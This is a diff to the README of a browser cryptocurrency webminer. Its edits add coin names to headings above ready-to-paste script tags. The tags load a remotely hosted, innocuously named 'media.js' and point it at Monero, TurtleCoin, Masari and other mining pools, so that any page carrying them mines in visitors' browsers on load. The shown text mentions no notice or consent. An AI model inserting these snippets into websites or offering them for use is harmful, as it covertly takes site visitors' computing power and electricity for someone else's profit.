@@ -7,25 +7,25 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 
 #### Simple Pool change: ?jason=Your_Favorite_Pool:PortNr
 
-#### Examples: CN V8 need ?algo=cn?variant=2<br> 
+#### Examples: CN V8 Coins (Monero, Lethean, Graft, X-CASH) need ?algo=cn?variant=2<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=2?jason=pool.supportxmr.com:3333" > </script>
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=2?jason=pool.intensecoin.com:3333" > </script>
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=2?jason=graft.ingest.cryptoknight.cc:9111" > </script>
 ```
-#### Examples: CN V7 need ?algo=cn?variant=1<br> 
+#### Examples: CN V7 Coins (MoneroV) need ?algo=cn?variant=1<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=monerov.ingest.cryptoknight.cc:9221" > </script>
 ```
-#### Examples: CN (ASIC) need ?algo=cn?variant=666<br> 
+#### Examples: CN (ASIC) Coins (Electroneum, Bytecoin, Sumokoin, Dero, Xeonbit, Pennykoin, Beldex, Newton, Karbo, X12 Coin, B2Bcoin) need ?algo=cn?variant=666<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=666?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: Stellite (CN-Half | CN Stellite V5) need ?algo=cn/xtl?variant=2<br> 
+#### Examples: Stellite (CN-Half Coins | CN Stellite V5) (Stellite) need ?algo=cn/xtl?variant=2<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/xtl?variant=2?jason=communitypool.stellite.cash:6677" > </script>
 ```
-#### Examples: CN Lite V7 need ?algo=cn-lite?variant=1
+#### Examples: CN Lite V7 Coins (Aeon, TurtleCoin, BitcoiNote, BBSCoin, Triton) need ?algo=cn-lite?variant=1
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=mine.supportaeon.com:3333" > </script>
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=Pool.TRTL.CryptoPool.Space:5555" > </script>
@@ -35,7 +35,7 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=2?jason=pool.nxstream.io:3333" > </script>
 ```
-#### Examples: CN Fast need ?algo=cn/msr?variant=1<br> 
+#### Examples: CN Fast Coins (Masari) need ?algo=cn/msr?variant=1<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/msr?variant=1?jason=masari.ingest.cryptoknight.cc:3333" > </script>
 ```
